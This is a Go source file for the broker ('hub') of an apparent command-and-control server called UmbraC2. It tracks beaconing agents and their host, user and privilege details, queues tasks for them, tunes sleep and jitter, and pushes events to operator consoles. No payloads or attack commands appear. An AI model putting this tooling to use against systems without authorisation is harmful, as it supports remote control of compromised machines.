// Package hub is the broker that ties agents, the task queue and operator
// subscribers together. Transports only speak frames; all state transitions
// happen here so TCP and HTTP behave identically.
package hub

import (
	"errors"
	"fmt"
	"log/slog"
	"sort"
	"sync"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/config"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
)

// Version is the server release, advertised in HELLO_ACK metadata.
const Version = "0.1.0"

// Errors returned by hub operations (mapped to operator-facing messages).
var (
	ErrNoSuchAgent = errors.New("no such agent")
	ErrTooMany     = errors.New("agent capacity reached")
)

// Event is pushed to subscribed operators.
type Event struct {
	Kind    string         `json:"kind"`
	AgentID string         `json:"agent_id,omitempty"`
	TaskID  string         `json:"task_id,omitempty"`
	Data    map[string]any `json:"data,omitempty"`
	At      time.Time      `json:"at"`
}

// Operator is a subscribed control channel.
type Operator struct {
	ID     int64
	Name   string
	Events chan Event
	Since  time.Time
	// Peer and Transport identify where the operator connected from; both are
	// recorded in the audit log so an entry can be traced to a session.
	Peer      string
	Transport string
}

// OperatorInfo is the public view of a connected operator console.
type OperatorInfo struct {
	ID        int64  `json:"id"`
	Name      string `json:"name"`
	Peer      string `json:"peer"`
	Transport string `json:"transport"`
	Since     string `json:"since"`
	// Backlog is how many events are queued for this console but not yet sent.
	// A persistently growing backlog means the console stopped reading.
	Backlog int `json:"backlog"`
}

// Live describes a currently connected agent.
type Live struct {
	AgentID   string
	Transport string
	Addr      string
	Suite     byte
	SessionID string
	Since     time.Time
}

// Hub owns all shared state.
type Hub struct {
	cfg   *config.Config
	store *store.Store
	log   *slog.Logger

	mu      sync.Mutex
	live    map[string]*Live
	subs    map[int64]*Operator
	nextSub int64
	started time.Time

	// dropped counts events discarded because a console's queue was full. It is
	// a health signal, not noise: if it grows, an operator is missing events.
	dropped uint64
}

// New creates a hub.
func New(cfg *config.Config, st *store.Store, log *slog.Logger) *Hub {
	return &Hub{
		cfg:     cfg,
		store:   st,
		log:     log,
		live:    make(map[string]*Live),
		subs:    make(map[int64]*Operator),
		started: time.Now().UTC(),
	}
}

// Store exposes the underlying store (read-mostly use).
func (h *Hub) Store() *store.Store { return h.store }

// Config exposes the configuration.
func (h *Hub) Config() *config.Config { return h.cfg }

// Log exposes the logger.
func (h *Hub) Log() *slog.Logger { return h.log }

// RegisterAgent records a live agent and returns the stored record.
func (h *Hub) RegisterAgent(meta *store.Agent, transport, addr string, suite byte, sessionID []byte) (*store.Agent, bool, error) {
	h.mu.Lock()
	if _, exists := h.live[meta.ID]; !exists && len(h.live) >= h.cfg.Server.Limits.MaxAgents {
		h.mu.Unlock()
		return nil, false, ErrTooMany
	}
	_, known := h.store.Agent(meta.ID)
	h.live[meta.ID] = &Live{
		AgentID:   meta.ID,
		Transport: transport,
		Addr:      addr,
		Suite:     suite,
		SessionID: fmt.Sprintf("%x", sessionID),
		Since:     time.Now().UTC(),
	}
	h.mu.Unlock()

	if meta.Sleep == 0 {
		meta.Sleep = h.cfg.Server.Beacon.Sleep
		meta.Jitter = h.cfg.Server.Beacon.Jitter
	}
	rec := h.store.UpsertAgent(meta)
	h.store.SaveAsync()
	if !known {
		h.Emit(Event{Kind: "agent.new", AgentID: rec.ID, Data: agentData(rec)})
		h.log.Info("agent registered", "agent", rec.ID, "host", rec.Host, "os", rec.OS, "transport", transport)
	} else {
		h.Emit(Event{Kind: "agent.online", AgentID: rec.ID, Data: agentData(rec)})
		h.log.Debug("agent online", "agent", rec.ID)
	}
	return rec, !known, nil
}

// UnregisterSession drops a link only if it is still the live one for the
// agent but also for the *same* session.
//
// A beacon reconnects after every cycle (TCP) or network change, so two
// sessions for one agent id coexist briefly. Without the session check the
// older goroutine's deferred cleanup deletes the newer entry and the agent
// shows as offline while it is happily beaconing.
func (h *Hub) UnregisterSession(agentID, sessionID string) {
	h.mu.Lock()
	cur, ok := h.live[agentID]
	if !ok || (sessionID != "" && cur.SessionID != sessionID) {
		h.mu.Unlock()
		return
	}
	delete(h.live, agentID)
	h.mu.Unlock()
	h.store.MarkOffline(agentID)
	h.store.SaveAsync()
	h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
}

// UnregisterAgent marks an agent offline when its link drops, without checking
// which session dropped it. Used for expiry, where there is no live peer left to
// race with.
func (h *Hub) UnregisterAgent(agentID string) {
	h.mu.Lock()
	delete(h.live, agentID)
	h.mu.Unlock()
	h.store.MarkOffline(agentID)
	h.store.SaveAsync()
	h.Emit(Event{Kind: "agent.offline", AgentID: agentID})
}

// Live returns the live link info for an agent.
func (h *Hub) Live(agentID string) (*Live, bool) {
	h.mu.Lock()
	defer h.mu.Unlock()
	l, ok := h.live[agentID]
	if !ok {
		return nil, false
	}
	cp := *l
	return &cp, true
}

// Agents returns stored agents annotated with liveness.
func (h *Hub) Agents() []map[string]any {
	h.mu.Lock()
	live := make(map[string]*Live, len(h.live))
	for k, v := range h.live {
		cp := *v
		live[k] = &cp
	}
	h.mu.Unlock()

	agents := h.store.Agents()
	out := make([]map[string]any, 0, len(agents))
	for _, a := range agents {
		d := agentData(a)
		if l, ok := live[a.ID]; ok {
			d["transport"] = l.Transport
			d["suite"] = l.Suite
			d["session_id"] = l.SessionID
			d["connected_since"] = l.Since.Format(time.RFC3339)
		}
		out = append(out, d)
	}
	return out
}

// SubmitTask queues a command for an agent.
func (h *Hub) SubmitTask(agentID, kind string, args map[string]any) (*store.Task, error) {
	if _, ok := h.store.Agent(agentID); !ok {
		return nil, ErrNoSuchAgent
	}
	if kind == "" {
		return nil, errors.New("task kind required")
	}
	t := h.store.AddTask(&store.Task{AgentID: agentID, Kind: kind, Args: args})
	h.store.SaveAsync()
	h.Emit(Event{Kind: "task.queued", AgentID: agentID, TaskID: t.ID,
		Data: map[string]any{"kind": t.Kind, "args": t.Args}})
	h.log.Info("task queued", "agent", agentID, "task", t.ID, "kind", t.Kind)
	return t, nil
}

// NextTasks marks and returns the tasks to ship in the current beacon cycle.
func (h *Hub) NextTasks(agentID string, max int) []*store.Task {
	tasks := h.store.Pending(agentID, max)
	for _, t := range tasks {
		h.Emit(Event{Kind: "task.delivered", AgentID: agentID, TaskID: t.ID})
	}
	return tasks
}

// CompleteTask stores a result and notifies operators.
func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, errMsg string) {
	t, ok := h.store.Complete(taskID, code, output, errMsg)
	if !ok {
		h.log.Warn("result for unknown task", "agent", agentID, "task", taskID)
		return
	}
	h.Emit(Event{Kind: "task.result", AgentID: agentID, TaskID: taskID, Data: map[string]any{
		"code": t.Code, "state": t.State, "output": string(t.Output), "err": t.Err,
	}})
	h.store.SaveAsync()
}

// CancelTask cancels a task.
func (h *Hub) CancelTask(taskID string) bool {
	ok := h.store.Cancel(taskID)
	if ok {
		h.Emit(Event{Kind: "task.cancelled", TaskID: taskID})
	}
	return ok
}

// SetPolicy updates an agent's beacon cadence.
func (h *Hub) SetPolicy(agentID string, sleep, jitter int) error {
	if sleep < 1 || sleep > 86400 || jitter < 0 || jitter > 90 {
		return errors.New("invalid sleep/jitter")
	}
	if !h.store.SetPolicy(agentID, sleep, jitter) {
		return ErrNoSuchAgent
	}
	h.Emit(Event{Kind: "agent.policy", AgentID: agentID,
		Data: map[string]any{"sleep": sleep, "jitter": jitter}})
	h.store.SaveAsync()
	return nil
}

// Policy returns the cadence the server wants an agent to use.
func (h *Hub) Policy(agentID string) (int, int) {
	if a, ok := h.store.Agent(agentID); ok && a.Sleep > 0 {
		return a.Sleep, a.Jitter
	}
	return h.cfg.Server.Beacon.Sleep, h.cfg.Server.Beacon.Jitter
}

// Subscribe registers an operator event stream.
func (h *Hub) Subscribe(name, peer, transport string) *Operator {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.nextSub++
	op := &Operator{
		ID:        h.nextSub,
		Name:      name,
		Events:    make(chan Event, 256),
		Since:     time.Now().UTC(),
		Peer:      peer,
		Transport: transport,
	}
	h.subs[op.ID] = op
	return op
}

// Unsubscribe removes and closes an operator stream.
func (h *Hub) Unsubscribe(id int64) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if op, ok := h.subs[id]; ok {
		close(op.Events)
		delete(h.subs, id)
	}
}

// Emit broadcasts an event without ever blocking a transport goroutine.
func (h *Hub) Emit(ev Event) {
	if ev.At.IsZero() {
		ev.At = time.Now().UTC()
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, op := range h.subs {
		select {
		case op.Events <- ev:
		default:
			h.dropped++
			h.log.Warn("operator event queue full, dropping event", "operator", op.Name, "kind", ev.Kind)
		}
	}
}

// Operators lists the connected consoles, sorted by name.
func (h *Hub) Operators() []OperatorInfo {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]OperatorInfo, 0, len(h.subs))
	for _, op := range h.subs {
		out = append(out, OperatorInfo{
			ID:        op.ID,
			Name:      op.Name,
			Peer:      op.Peer,
			Transport: op.Transport,
			Since:     op.Since.Format(time.RFC3339),
			Backlog:   len(op.Events),
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out
}

// Stats returns a server-wide snapshot for the operator CLI.
func (h *Hub) Stats() map[string]any {
	h.mu.Lock()
	live, subs, dropped := len(h.live), len(h.subs), h.dropped
	h.mu.Unlock()
	out := h.store.Stats()
	out["agents_live"] = live
	out["operators"] = subs
	out["events_dropped"] = dropped
	out["uptime_s"] = int(time.Since(h.started).Seconds())
	out["protocol"] = "umbra/v1"
	out["suites"] = []string{"aes-256-gcm"}
	return out
}

func agentData(a *store.Agent) map[string]any {
	return map[string]any{
		"id":         a.ID,
		"host":       a.Host,
		"os":         a.OS,
		"arch":       a.Arch,
		"user":       a.User,
		"pid":        a.PID,
		"version":    a.Version,
		"integrity":  a.Integrity,
		"transport":  a.Transport,
		"addr":       a.Addr,
		"sleep":      a.Sleep,
		"jitter":     a.Jitter,
		"state":      a.State,
		"checkins":   a.Checkins,
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"last_seen":  a.LastSeen.Format(time.RFC3339),
	}
}
